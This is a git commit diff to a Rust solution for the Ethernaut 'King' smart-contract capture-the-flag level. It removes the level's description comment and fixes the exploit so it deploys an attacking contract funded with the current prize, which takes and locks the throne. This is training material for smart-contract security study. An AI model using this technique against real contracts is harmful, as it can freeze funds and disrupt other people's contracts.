42a790029354e55b9c100b7b319cffb228037b9a
0xgleb <gleb.dianov@protonmail.com>
2023-09-01 19:30:20 +0200

    fix king attack

--- attack/src/ethernaut/hack09_king.rs
+++ attack/src/ethernaut/hack09_king.rs
@@ -9,23 +9,6 @@ pub(crate) struct Exploit;
 impl ctf::Exploit for Exploit {
     type Target = Target;
 
-    /**
-     * @title Ethernaut Level 9: King
-     *
-     * The contract below represents a very simple game:
-     * whoever sends it an amount of ether that is
-     * larger than the current prize becomes the new
-     * king. On such an event, the overthrown king
-     * gets paid the new prize, making a bit of ether
-     * in the process! As ponzi as it gets xD
-     *
-     * Such a fun game. Your goal is to break it.
-     *
-     * When you submit the instance back to the level,
-     * the level is going to reclaim kingship. You
-     * will beat the level if you can avoid such a self
-     * proclamation.
-     */
     async fn attack(
         self,
         target: &Self::Target,
@@ -33,7 +16,7 @@ impl ctf::Exploit for Exploit {
     ) -> eyre::Result<()> {
         let king = King::new(target.address, offender.to_owned());
         let exploit = KingExploit::deploy(offender.to_owned(), king.address())?
-            .value(U256::from(1))
+            .value(king.prize().await?)
             .send()
             .await?;
 
